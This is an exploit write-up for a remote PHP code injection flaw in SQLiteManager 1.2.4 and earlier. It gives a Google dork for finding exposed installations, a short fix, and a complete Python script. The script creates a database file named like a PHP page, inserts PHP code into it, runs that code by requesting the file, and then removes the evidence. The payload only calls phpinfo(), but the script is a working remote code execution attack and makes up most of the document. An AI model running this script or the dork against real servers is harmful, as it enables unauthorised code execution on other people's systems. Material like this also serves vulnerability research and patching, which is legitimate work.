===============================================================
Exploit Title: SQLiteManager 0Day Remote PHP Code Injection Vulnerability
Google Dork: intitle:SQLiteManager inurl:sqlite/
Date: 23/01/2013
Exploit Author: RealGame
Vendor Homepage: http://www.Relagame.co.il
Software Link: http://sourceforge.net/projects/sqlitemanager/
Version: <=1.2.4
Tested on: Windows XP, Debian 2.6.32-46
CVE: N/A
===============================================================
Vulnerable Softwares:
 
Name: SQLiteManager
Official Site: http://www.sqlitemanager.org/
 
Name: Ampps
Official Site: http://www.ampps.com/
 
Name: VertrigoServ
Official Site: http://vertrigo.sourceforge.net/
===============================================================
About Software:
Official Site: http://www.sqlitemanager.org/
SQLiteManager is a database manager for SQLite databases. You can manage
any SQLite database created on any platform with SQLiteManager.
===============================================================
Easy Way To Fix:
Find: SQLiteStripSlashes($_POST[&#039;dbpath&#039;])
Replace: str_replace(&#039;.&#039;, &#039;&#039;, SQLiteStripSlashes($_POST[&#039;dbpath&#039;]))
On File: ./include/add_database.php
===============================================================
 
import re
import urllib2
from urllib import urlencode
from sys import argv, exit

def strip_tags(value):
    #Strip tags with RegEx
    return re.sub(&#039;<[^>]*?>&#039;, &#039;&#039;, value)

def getDbId(sqliteUrl, myDbName):
    #Find Components
    htmlRes = urllib2.urlopen(sqliteUrl, None, 120).read()
    if htmlRes:
        #If you found it take all the rows
        td = re.findall(&#039;<td class="name_db">(.*?)</td>&#039;, htmlRes, re.DOTALL)
        #Make a dict of stripped columns
        for element in td: 
            if strip_tags(element) == myDbName:
                #Return Id
                return "".join(re.findall(&#039;\?dbsel=(.*?)"&#039;, element, re.DOTALL))
    return None

def main():
    print \
        &#039;SQLiteManager Exploit\n&#039; + \
        &#039;Made By RealGame\n&#039; + \
        &#039;http://www.RealGame.co.il\n&#039;
    
    if len(argv) < 2:
        #replace(&#039;\\&#039;, &#039;/&#039;) - To Do The Same In Win And Linux
        filename = argv[0].replace(&#039;\\&#039;, &#039;/&#039;).split(&#039;/&#039;)[-1]
        
        print &#039;Execute Example: &#039; + filename + &#039; http://127.0.0.1/sqlite/\n&#039;
        exit()
    
    sqliteUrl = argv[1]     
    myDbName  = "phpinfo"
    myDbFile  = "phpinfo.php"
    #Create Database
    params = {&#039;dbname&#039;      : myDbName,
              &#039;dbVersion&#039;   : &#039;2&#039;,
              &#039;dbRealpath&#039;  : None,
              &#039;dbpath&#039;      : myDbFile,
              &#039;action&#039;      : &#039;saveDb&#039;}
    urllib2.urlopen(sqliteUrl + "main.php", urlencode(params), 120)
    #Get Database ID
    dbId = getDbId(sqliteUrl + "left.php", myDbName)
    #If Database Created
    if dbId:
        #Create Table + Shell Creator
        params = {&#039;DisplayQuery&#039;    : &#039;CREATE TABLE temptab ( codetab text );\n&#039; + \
                                      &#039;INSERT INTO temptab VALUES (\&#039;<?php phpinfo(); unlink(__FILE__); ?>\&#039;);\n&#039;,
                  &#039;sqlFile&#039;         : None,
                  &#039;action&#039;          : &#039;sql&#039;,
                  &#039;sqltype&#039;         : &#039;1&#039;}
        urllib2.urlopen(sqliteUrl + "main.php?dbsel=%s&table=temptab" %dbId, urlencode(params), 120)
        #Inject Code
        urllib2.urlopen(sqliteUrl + myDbFile, None, 120)
        #Remove Database
        urllib2.urlopen(sqliteUrl + "main.php?dbsel=%s&table=&view=&trigger=&function=&action=del" %dbId, None, 120)
        print &#039;Succeed&#039;
        return
        
    print &#039;Failed&#039;

if __name__ == &#039;__main__&#039;:
    main()

